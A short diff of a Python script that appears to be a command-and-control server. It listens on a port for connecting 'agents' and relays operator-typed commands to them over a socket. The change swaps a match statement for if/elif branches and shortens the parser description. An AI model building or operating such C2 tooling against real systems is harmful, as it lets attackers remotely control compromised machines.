@@ -3,7 +3,7 @@ import socket
 import argparse
 import time
 
-parser = argparse.ArgumentParser(description="SSH C2 server configuration to listen for agents")
+parser = argparse.ArgumentParser(description="C2 server configuration to listen for agents")
 parser._action_groups.pop()
 optional = parser.add_argument_group("Optional")
 optional.add_argument("-p", dest="port", type=int, default=2222, help="Port to listen (Default: 2222)")
@@ -59,15 +59,14 @@ def main():
                 cmd_line = (f"|-- {user}@{host} \n|>> ")
                 command = input(cmd_line + "")
                 head = command.split(" ")[0]
-                match head:
-                    case "":
-                        comm_handler()
-                    case "!exit":
-                        conn.send(command)
-                        exit()
-                    case _:
-                        conn.send(command)
-                        incoming()
+                if head == "":
+                    comm_handler()
+                elif head == "!exit":
+                    conn.send(command)
+                    exit()
+                else:
+                    conn.send(command)
+                    incoming()
             except Exception as ex:
                 print(str(ex))
                 pass
